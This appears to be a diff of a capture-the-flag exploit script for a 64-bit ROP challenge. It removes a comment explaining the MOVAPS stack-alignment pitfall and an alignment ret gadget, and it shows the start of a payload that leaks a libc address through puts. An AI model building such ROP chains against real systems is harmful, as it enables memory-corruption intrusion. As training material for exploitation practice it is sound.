@@ -41,11 +41,6 @@ if _gdb and _debug and _remote==0:
 
 addr_main=elf_prog.symbols['main']
 got_puts=elf_prog.got['puts']
-'''
-The MOVAPS issue
-If you're using Ubuntu 18.04 and segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). The version of GLIBC packaged with Ubuntu 18.04 uses movaps instructions to move data onto the stack in some functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.
-'''
-ret_main=0x0000000000400611
 
 # ROPgadget --binary rop --only "pop|ret"
 pop_rdi_ret=0x0000000000400683
@@ -56,7 +51,6 @@ plt_puts= elf_prog.plt['puts']
 # phase 1 leak libc address
 payload  = ""
 payload += "a"*(32+8) # padding to EBP of main
-payload += pack("Q",ret_main)
 payload += pack("Q",pop_rdi_ret)
 payload += pack("Q",got_puts)
 payload += pack("Q",plt_puts) # puts(got_puts)
